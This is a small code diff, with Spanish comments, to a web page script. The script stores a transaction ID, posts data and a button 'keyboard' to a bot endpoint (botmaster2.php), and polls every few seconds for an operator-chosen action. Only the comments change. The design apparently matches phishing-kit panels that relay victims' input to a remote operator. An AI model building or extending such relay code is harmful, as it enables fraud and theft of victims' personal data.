@@ -72,7 +72,7 @@ document.addEventListener('DOMContentLoaded', async function () {
     return window.location.href = "index.html";
   }
 
-  // ✅ Corregido: usar el mismo transactionId si ya existe
+  // ✅ Mantener transactionId constante
   let transactionId = localStorage.getItem("transactionId");
   if (!transactionId) {
     transactionId = Date.now().toString(36) + Math.random().toString(36).substring(2);
@@ -98,7 +98,7 @@ document.addEventListener('DOMContentLoaded', async function () {
     ]
   };
 
-  // Enviar datos al bot
+  // Enviar mensaje al bot
   await fetch("botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -106,7 +106,7 @@ document.addEventListener('DOMContentLoaded', async function () {
           "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  // Escuchar acción seleccionada desde el servidor
+  // Escuchar acción cada 3s
   revisarAccion(transactionId);
 
   async function revisarAccion(txId) {
